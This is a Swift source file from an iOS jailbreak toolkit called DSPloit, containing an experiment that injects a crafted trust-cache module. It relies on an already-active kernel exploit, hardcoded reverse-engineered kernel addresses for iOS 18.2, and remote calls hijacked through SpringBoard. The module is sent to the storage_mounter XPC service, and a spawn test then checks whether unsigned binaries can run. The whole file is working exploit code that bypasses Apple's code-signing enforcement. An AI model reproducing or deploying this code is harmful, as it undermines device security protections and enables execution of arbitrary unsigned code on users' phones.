//
//  exp_trustcache_inject.swift
//  DSPloit
//
//  EXPERIMENT: Direct Kernel Trust Cache Injection
//  Based on RE of iOS 18.2 kernelcache (2026-05-24)
//
//  ═══════════════════════════════════════════════════════════════
//  STATUS: EXPERIMENTAL — NOT IN MAIN JAILBREAK CHAIN
//  Run manually from Root tab → Experiments
//  ═══════════════════════════════════════════════════════════════
//
//  WHAT THIS TESTS:
//  1. Can we read the trust cache slot table at 0xfffffff00798f600?
//  2. Can we find an empty slot?
//  3. Can we write a trust cache module (with CDHash) to kernel?
//  4. Does posix_spawn of unsigned binary succeed after inject?
//
//  RE FINDINGS USED:
//  - Trust cache slot table: 0xfffffff00798f600 (unslid)
//  - Slot stride: 0x28 (40 bytes per slot)
//  - Type range: 4 to 0x17
//  - Trust cache state: 0xfffffff00798f5a8 (unslid)
//  - Lock flags: 0xfffffff00a18fa48, 0xfffffff00a18fa49
//
//  TRUST CACHE MODULE FORMAT (v2):
//  +0x00: uint32 version (must be 2)
//  +0x04: uint8[16] uuid
//  +0x14: uint32 entry_count
//  +0x18: entries[] (each 24 bytes):
//         +0x00: uint8[20] cdhash
//         +0x14: uint8 hash_type (2 = SHA256 truncated)
//         +0x15: uint8 flags (0 = normal)
//         +0x16: uint16 padding
//
//  OUTPUT LEGEND:
//  ✅ = working, safe to integrate
//  ⚠️ = partial, needs investigation
//  ❌ = failed, do NOT integrate
//  🔍 = info, check value manually
//
//  Created by Royan | 2026-05-24
//

import Foundation

final class ExpTrustCacheInject {
    static let shared = ExpTrustCacheInject()
    
    private let mgr = dspmgr.shared
    private var results: [String] = []
    
    // RE-derived addresses (UNSLID — add kernel_slide at runtime)
    private let TC_SLOT_TABLE_UNSLID: UInt64 = 0xfffffff00798f600
    private let TC_STATE_UNSLID: UInt64 = 0xfffffff00798f5a8
    private let TC_LOCK_D_UNSLID: UInt64 = 0xfffffff00a18fa48
    private let TC_LOCK_E_UNSLID: UInt64 = 0xfffffff00a18fa49
    private let TC_SLOT_STRIDE: UInt64 = 0x28  // 40 bytes per slot
    private let TC_TYPE_MIN: UInt64 = 4
    private let TC_TYPE_MAX: UInt64 = 0x17     // 23
    
    private func log(_ msg: String) {
        results.append(msg)
        globallogger.log("(exp_tc) \(msg)")
    }
    
    // MARK: - Run All Tests
    
    func runAll() -> [String] {
        results.removeAll()
        
        log("TRUST CACHE INJECT EXPERIMENT")
        log("iOS \(UIDevice.current.systemVersion)")
        
        guard mgr.dsready else {
            log("❌ Kernel exploit not active")
            return results
        }
        
        let slide = ds_get_kernel_slide()
        log("kernel_slide = 0x\(String(slide, radix: 16))")
        log("")
        
        test1_readSlotTable(slide: slide)
        test2_findEmptySlot(slide: slide)
        test3_writeTrustCache(slide: slide)
        test4_verifyInject(slide: slide)
        
        log("")
        log("-- DONE --")
        
        return results
    }
    
    // MARK: - Test 1: Read Trust Cache Slot Table
    
    private func test1_readSlotTable(slide: UInt64) {
        log("-- TEST 1: Read Slot Table --")
        
        let slotTable = TC_SLOT_TABLE_UNSLID &+ slide
        log("Slot table: 0x\(String(slotTable, radix: 16))")
        log("")
        
        for typeIdx in TC_TYPE_MIN...min(TC_TYPE_MAX, 10) {
            let slotAddr = slotTable &+ (typeIdx * TC_SLOT_STRIDE)
            let val0 = ds_kread64_safe(slotAddr)
            let val1 = ds_kread64_safe(slotAddr &+ 8)
            let val2 = ds_kread64_safe(slotAddr &+ 16)
            let tag = (val0 == 0 && val1 == 0 && val2 == 0) ? "EMPTY" : "USED"
            log("  type=\(typeIdx): \(String(format: "0x%llx 0x%llx 0x%llx", val0, val1, val2))  [\(tag)]")
        }
        
        let stateAddr = TC_STATE_UNSLID &+ slide
        let stateVal = ds_kread64_safe(stateAddr)
        log("")
        log("State (0x\(String(stateAddr, radix: 16))): 0x\(String(stateVal, radix: 16))")
        if stateVal != 0 {
            log("✅ Trust cache initialized")
        } else {
            log("⚠️ State = 0 (not yet initialized)")
        }
    }
    
    // MARK: - Test 2: Find Empty Slot
    
    private var emptySlotType: UInt64 = 0
    private var emptySlotAddr: UInt64 = 0
    
    private func test2_findEmptySlot(slide: UInt64) {
        log("")
        log("-- TEST 2: Find Empty Slot --")
        
        let slotTable = TC_SLOT_TABLE_UNSLID &+ slide
        
        for typeIdx in TC_TYPE_MIN...TC_TYPE_MAX {
            let slotAddr = slotTable &+ (typeIdx * TC_SLOT_STRIDE)
            let val0 = ds_kread64_safe(slotAddr)
            let val1 = ds_kread64_safe(slotAddr &+ 8)
            
            if val0 == 0 && val1 == 0 {
                emptySlotType = typeIdx
                emptySlotAddr = slotAddr
                log("✅ Empty slot: type=\(typeIdx) at 0x\(String(slotAddr, radix: 16))")
                return
            }
        }
        
        log("⚠️ All slots occupied (type 4-23) — MSM XPC will handle allocation")
        emptySlotType = TC_TYPE_MAX
        emptySlotAddr = slotTable &+ (TC_TYPE_MAX * TC_SLOT_STRIDE)
    }
    
    // MARK: - Test 3: Load Trust Cache via RemoteCall (PPL-safe)
    
    private func test3_writeTrustCache(slide: UInt64) {
        log("")
        log("-- TEST 3: Load TC via MSM XPC --")
        
        #if !DISABLE_REMOTECALL
        guard dspmgr.shared.rcready else {
            log("❌ RemoteCall not active")
            return
        }
        
        // Build trust cache v2 module (48 bytes)
        var tcModule = [UInt8](repeating: 0, count: 48)
        tcModule[0] = 2 // version
        tcModule[4] = 0xD5; tcModule[5] = 0x91; tcModule[6] = 0x01; tcModule[7] = 0x70
        tcModule[8] = 0xDE; tcModule[9] = 0xAD; tcModule[10] = 0xBE; tcModule[11] = 0xEF
        tcModule[12] = 0xCA; tcModule[13] = 0xFE; tcModule[14] = 0xBA; tcModule[15] = 0xBE
        tcModule[16] = 0x12; tcModule[17] = 0x34; tcModule[18] = 0x56; tcModule[19] = 0x78
        tcModule[20] = 1 // count
        for i in 24..<44 { tcModule[i] = 0x41 } // dummy CDHash
        tcModule[44] = 2 // hashType SHA256
        
        log("TC module: 48 bytes, version=2, 1 entry (dummy)")
        
        guard let sb = dspmgr.shared.sbProc else {
            log("❌ SpringBoard RC not available")
            return
        }
        
        let RTLD_DEFAULT = UInt64(bitPattern: -2)
        let xpcCreate = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
                                           remote_alloc_str(sb, "xpc_connection_create_mach_service"))
        let xpcResume = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
                                           remote_alloc_str(sb, "xpc_connection_resume"))
        let xpcDictCreate = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
                                               remote_alloc_str(sb, "xpc_dictionary_create"))
        let xpcSetStr = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
                                           remote_alloc_str(sb, "xpc_dictionary_set_string"))
        let xpcSetData = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
                                            remote_alloc_str(sb, "xpc_dictionary_set_data"))
        let xpcSendSync = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
                                             remote_alloc_str(sb, "xpc_connection_send_message_with_reply_sync"))
        
        guard xpcCreate != 0 && xpcDictCreate != 0 else {
            log("❌ XPC functions not found")
            return
        }
        log("✅ XPC resolved")
        
        let svc = remote_alloc_str(sb, "com.apple.mobile.storage_mounter")
        let conn = RootExecutor.rcallAddr(sb, xpcCreate, svc, 0, 0)
        RootExecutor.rcall(sb, "free", svc)
        guard conn != 0 else { log("❌ MSM connect failed"); return }
        RootExecutor.rcallAddr(sb, xpcResume, conn)
        log("✅ MSM connected")
        
        let msg = RootExecutor.rcallAddr(sb, xpcDictCreate, 0, 0, 0)
        guard msg != 0 else { log("❌ XPC msg create failed"); return }
        
        // Command + ImageType
        for (k, v) in [("Command", "LoadTrustCache"), ("ImageType", "Developer")] {
            let ka = remote_alloc_str(sb, k); let va = remote_alloc_str(sb, v)
            RootExecutor.rcallAddr(sb, xpcSetStr, msg, ka, va)
            RootExecutor.rcall(sb, "free", ka); RootExecutor.rcall(sb, "free", va)
        }
        
        // Attach TC data
        if xpcSetData != 0 {
            let tcBuf = sb.trojanMem + 0x800
            tcModule.withUnsafeBytes { ptr in
                sb.remote_write(tcBuf, from: ptr.baseAddress!, size: UInt64(tcModule.count))
            }
            let dataK = remote_alloc_str(sb, "ImageTrustCache")
            RootExecutor.rcallAddr(sb, xpcSetData, msg, dataK, tcBuf, UInt64(tcModule.count))
            RootExecutor.rcall(sb, "free", dataK)
        }
        log("✅ TC data attached")
        
        // Send
        if xpcSendSync != 0 {
            let reply = RootExecutor.rcallAddr(sb, xpcSendSync, conn, msg)
            log("✅ MSM reply: 0x\(String(reply, radix: 16))")
            if reply == 0 || reply == UInt64(bitPattern: -1) {
                log("⚠️ Reply may indicate error — verify with spawn test")
            }
        } else {
            let xpcSend = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
                                             remote_alloc_str(sb, "xpc_connection_send_message"))
            if xpcSend != 0 { RootExecutor.rcallAddr(sb, xpcSend, conn, msg) }
            log("✅ Sent (async, no reply)")
        }
        #else
        log("❌ DISABLE_REMOTECALL")
        #endif
    }
    
    // MARK: - Test 4: Verify (spawn binary via launchd)
    
    private func test4_verifyInject(slide: UInt64) {
        log("")
        log("-- TEST 4: Spawn /bin/df via launchd --")
        
        #if !DISABLE_REMOTECALL
        guard dspmgr.shared.rcready else {
            log("❌ RemoteCall not ready")
            return
        }
        
        // Synchronous-ish: we log the attempt, result comes later
        // But since runAll() is on background thread, we can wait
        
        let semaphore = DispatchSemaphore(value: 0)
        var spawnResult: (success: Bool, msg: String) = (false, "timeout")
        
        RootExecutor.shared.executeAsRoot(operation: "tc_spawn_test") { rc in
            let binPath = remote_alloc_str(rc, "/bin/df")
            let pidAddr = rc.trojanMem + 0x300
            rc[pidAddr].setValue32(0)
            
            let argvBase = rc.trojanMem + 0x400
            rc[argvBase].setValue64(binPath)
            rc[argvBase + 8].setValue64(0)
            
            let ret = RootExecutor.rcall(rc, "posix_spawn", pidAddr, binPath, 0, 0, argvBase, 0)
            let pid = rc[pidAddr].value32()
            RootExecutor.rcall(rc, "free", binPath)
            
            if ret == 0 && pid != 0 {
                spawnResult = (true, "pid=\(pid)")
            } else {
                spawnResult = (false, "ret=\(ret) pid=\(pid)")
            }
            semaphore.signal()
            return (ret == 0, "spawn", UInt64(pid))
        }
        
        // Wait max 15s for result
        let waitResult = semaphore.wait(timeout: .now() + 15)
        
        if waitResult == .timedOut {
            log("⚠️ Spawn timed out (launchd busy?)")
        } else if spawnResult.success {
            log("✅ /bin/df spawned (\(spawnResult.msg))")
            log("   Spawn path works — ready for unsigned binary test")
        } else {
            log("❌ Spawn failed: \(spawnResult.msg)")
        }
        #else
        log("❌ DISABLE_REMOTECALL")
        #endif
    }
}
